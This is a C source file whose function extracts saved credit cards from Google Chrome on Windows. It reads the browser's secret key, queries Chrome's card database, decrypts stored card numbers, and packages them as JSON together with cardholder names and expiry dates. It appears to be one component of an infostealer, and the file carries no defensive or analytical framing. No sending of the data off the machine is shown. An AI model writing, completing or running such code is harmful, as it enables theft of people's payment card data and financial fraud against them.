#include <stdint.h>
#include <stdio.h>
#include <windows.h>
#include <cJSON/cJSON.h>
#include <sqlite3.h>
#include <time.h>
#include "Chrome.h"

char* GetChromeSavedCreditcards(){
	char chromeCardsPath[MAX_PATH_LENGTH],LocalStatePath[MAX_PATH_LENGTH];
	CHROME_PATH_LOCAL_STATE(LocalStatePath);
	CHROME_PATH_CREDIT_CARDS(chromeCardsPath);
	char *json_string;
	
	DATA_BLOB SecretKey;
	GetSecretKey(LocalStatePath, &SecretKey);

	sqlite3* conn = getDBConnection(chromeCardsPath);
	if (conn != NULL) {
		sqlite3_stmt *stmt;
		const char *query = "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards";
		if (sqlite3_prepare_v2(conn, query, -1, &stmt, NULL) == SQLITE_OK) {
			int result;
			// Create a cJSON array
    		cJSON *json_array = cJSON_CreateArray();
    		int i = 1;
			while ((result = sqlite3_step(stmt)) == SQLITE_ROW) {
				
		        char *GUID = strdup((char*)sqlite3_column_text(stmt, 0));
		        char *Name = strdup((char*)sqlite3_column_text(stmt, 1));
		        char *ExpirationMonth = strdup((char*)sqlite3_column_text(stmt, 2));
		        char *ExpirationYear = strdup((char*)sqlite3_column_text(stmt, 3));
		        BYTE* encryptValue = (BYTE*)sqlite3_column_blob(stmt, 4);
		        int encryptValueLen = sqlite3_column_bytes(stmt, 4);
		        char *Address = strdup((char*)sqlite3_column_text(stmt, 5));
		        char *NickName = strdup((char*)sqlite3_column_text(stmt, 6));
				if(strcmp(GUID, "") && strcmp(Name, "")){
					DATA_BLOB cipher = (DATA_BLOB) {encryptValueLen,encryptValue};
					// Create a cJSON object for an entry
					cJSON *entry = cJSON_CreateObject();
					// Add id, host_key, name, path, cookies and expires_utc  to the entry
					cJSON_AddNumberToObject(entry, "id", i);
					cJSON_AddStringToObject(entry, "guid", GUID);
					cJSON_AddStringToObject(entry, "name_on_card", Name);
					cJSON_AddStringToObject(entry, "expiration_month", ExpirationMonth);
					cJSON_AddStringToObject(entry, "expiration_year", ExpirationYear);
					cJSON_AddStringToObject(entry, "billing_address_id", Address);
					cJSON_AddStringToObject(entry, "nickname", NickName);
					cJSON_AddStringToObject(entry, "card_number", DecryptPassword(cipher,SecretKey));

					// Add the entry to the array
					cJSON_AddItemToArray(json_array, entry);
					i++;
				}	
			}
			
			json_string = cJSON_Print(json_array);
			cJSON_Delete(json_array);
			sqlite3_finalize(stmt);
			sqlite3_close(conn);

		} else {
			fprintf(stderr, "Error preparing SQL statement: %s\n", sqlite3_errmsg(conn));
			sqlite3_close(conn);
		}
		
	}
	remove("temp.db");
	return json_string;
}